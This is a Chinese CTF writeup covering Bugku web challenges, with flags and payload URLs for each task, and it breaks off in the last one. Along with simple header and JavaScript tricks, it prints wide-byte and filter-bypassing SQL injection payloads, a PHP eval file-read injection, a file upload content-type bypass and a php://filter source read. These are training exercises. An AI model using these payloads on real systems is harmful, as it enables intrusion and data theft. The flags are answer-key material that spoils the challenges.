---
mathjax: false
title: Bugku Writeup
date: 2018-04-06 00:12:06
---

### WEB

#### WEB2

> 听说聪明的人都能找到答案
> http://120.24.86.145:8002/web2/

源码中有注释。 ` KEY{Web-2-bugKssNNikls9100}` 

#### 文件上传测试

> <http://103.238.227.13:10085/>
>
> Flag格式：Flag:xxxxxxxxxxxxx

`Flag:42e97d465f962c53df9549377b513c7e` 

上传文件后缀为PHP且修改`content-type` 值为`image/gif` 等即可。 

#### 计算题

> 地址：http://120.24.86.145:8002/yanzhengma/

修改前端限制。`flag{CTF-bugku-0032}` 

#### web基础$_GET

>  http://120.24.86.145:8002/get/

访问`http://120.24.86.145:8002/get/?what=flag` 。`flag{bugku_get_su8kej2en}` 

#### web基础$_POST

> http://120.24.86.145:8002/post/

使用hackbar post `what=flag` 。 `flag{bugku_get_ssseint67se}` 

#### 你从哪里来

> <http://120.24.86.145:9009/from.php>

添加HTTP头 `Referer:https://www.google.com` 

`flag{bug-ku_ai_admin}` 

#### 头等舱

> <http://120.24.86.145:9009/hd.php>

响应头 `flag{Bugku_k8_23s_istra}: ` ，在f12直接看看不出来。

#### md5 collision(NUPT_CTF)

> <http://120.24.86.145:9009/md5.php>

`http://120.24.86.145:9009/md5.php?a=s878926199a`

`flag{md5_collision_is_easy}`

#### 矛盾

> http://120.24.86.145:8002/get/index1.php

```php
$num=$_GET['num'];
if(!is_numeric($num)){
echo $num;
if($num==1)
echo 'flag{**********}';
}
```

`http://120.24.86.145:8002/get/index1.php?num=1x` 

`http://120.24.86.145:8002/get/index1.php?num=1e0x`  

`flag{bugku-789-ps-ssdf}` 

#### WEB3

> flag就在这里快来找找吧
> http://120.24.86.145:8002/web3/

CTRL+U;CTRL+W;CTRL+END 得到：

```html
<!--&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;-->
```

```python
s = '&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;'
print ''.join(map(lambda x: chr(int(x)), s.strip('&#;').split(';&#')))
# KEY{J2sa42ahJK-HS11III}
```

#### SQL注入

> http://103.238.227.13:10083/
>
> 格式KEY{}

宽字节注入。

```php
http://103.238.227.13:10083/?id=1%dd'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1輁'' LIMIT 1' at line 1

http://103.238.227.13:10083/?id=1%dd'--+
正常返回

http://103.238.227.13:10083/?id=1%dd' order by 2--+
确定查询列数为2
  
http://103.238.227.13:10083/?id=1%dd' union select string,0 from `key` where id=1--+
54f3320dc261f313ba712eb3f13a1f6d
```

#### 域名解析

> 听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag

访问`120.24.86.145` 并burp抓包，修改host值为` flag.bugku.com` 即可。`KEY{DSAHDSJ82HDS2211}` 

#### SQL注入1

> 地址：http://103.238.227.13:10087/
>
> 提示：过滤了关键字 你能绕过他吗
>
> flag格式KEY{xxxxxxxxxxxxx}

部分过滤代码

```php
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}
//xss过滤
$id = strip_tags($id);
$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
```

`strip_tags` 用以从字符串中去除 HTML 和 PHP 标记，可利用其绕过sql关键字过滤。

```php
http://103.238.227.13:10087?id=1 an<a>d 1=2--+
验证过滤思路可行

http://103.238.227.13:10087?id=1 o<a>rder by 2--+
确定查询列数为2

http://103.238.227.13:10087?id=1 un<a>ion sel<a>ect 1,hash fr<a>om `key` where id=1--+
c3d3c17b4ca7f791f85e#$1cc72af274af4adef
```

#### 你必须让他停下

> 地址：http://120.24.86.145:8002/web12/
>
> 作者：@berTrAM

在chrome  dev tool 里禁用js，然后手动刷新几次页面。页面里的图片地址不总是有效，有图片显示时(10.jpg)查看源码可见flag。或者burp抓包后重复发包几次。

`flag{dummy_game_1s_s0_popular}`

#### 本地包含

> 地址：http://120.24.86.145:8003/

```php
<?php 
    include "flag.php"; 
    $a = @$_REQUEST['hello']; 
    eval( "var_dump($a);"); 
    show_source(__FILE__); 
?>
  
  ---------------------------------------------------
view-source:http://120.24.86.145:8003/?hello=scandir('.')
view-source:http://120.24.86.145:8003/?hello=file('flag.php')
flag{bug-ctf-gg-99}
```

#### 变量1

> http://120.24.86.145:8004/index1.php

```php
flag In the variable ! <?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
        die("args error!");
    }
    eval("var_dump($$args);");
}?>
```

我们可以读取一个可变变量的值，但不知变量的名字，考虑[超全局变量](http://php.net/manual/zh/language.variables.superglobals.php) 。

```PHP
view-source:http://120.24.86.145:8004/index1.php?args=GLOBALS
["ZFkwe3"]=>
  string(38) "flag{92853051ab894a64f7865cf3c2128b34}"
```

#### WEB5

> JSPFUCK??????答案格式CTF{**}
>
> http://120.24.86.145:8002/web5/
>
> 字母大写

```javascript
([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]])
```

在chrome console 运行。题目说字母大写。`CTF{WHATFK}`

#### WEB4

> 看看源代码吧
>
> http://120.24.86.145:8002/web4/

```javascript
var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));
```

在chrome console 运行

```javascript
var p1 = '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
var p2 = '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
unescape(p1) + unescape('%35%34%61%61%32' + p2);
```

得到

```javascript
function checkSubmit(){
	var a=document.getElementById("password");
	if("undefined"!=typeof a){
			if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)
				return!0;
			alert("Error");
			a.focus();return!1
		}
}
document.getElementById("levelQuest").onsubmit=checkSubmit;
```

填入`67d709b2b54aa2aa648cf6e87a7114f1`  。`KEY{J22JK-HS11}`

#### flag在index里

>  http://120.24.86.145:8005/post/

```php
//使用php的filter读取源码
//http://120.24.86.145:8005/post/index.php?file=php://filter/convert.base64-encode/resource=index.php
<html>
    <title>Bugku-ctf</title>    
<?php
